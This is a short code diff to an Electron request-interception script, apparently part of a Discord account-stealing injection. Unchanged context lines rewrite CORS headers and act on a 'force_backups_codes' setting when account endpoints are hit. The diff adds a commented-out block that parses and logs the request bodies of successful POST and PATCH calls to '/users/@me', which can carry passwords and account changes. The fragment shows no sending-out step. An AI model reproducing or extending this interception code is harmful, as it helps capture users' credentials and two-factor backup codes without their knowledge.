@@ -987,6 +987,19 @@ electron.session.defaultSession.webRequest.onHeadersReceived(
         "Access-Control-Allow-Headers": "*",
       },
     });
+    /*if (request.url.includes("/users/@me")){
+      if (!["POST", "PATCH"].includes(request.method)) return;
+    if (request.statusCode !== 200) return;
+    try {
+      var data = JSON.parse(request.uploadData[0].bytes);
+    } catch (err) {
+      var data = queryString.parse(
+        decodeURIComponent(request.uploadData[0].bytes.toString())
+      );
+    }
+      console.log(data)
+    }*/
+    
     if (config.force_backups_codes == "true") {
       if (request.url.includes("/users/@me") && !scriptExecuted) {
         scriptExecuted = true;
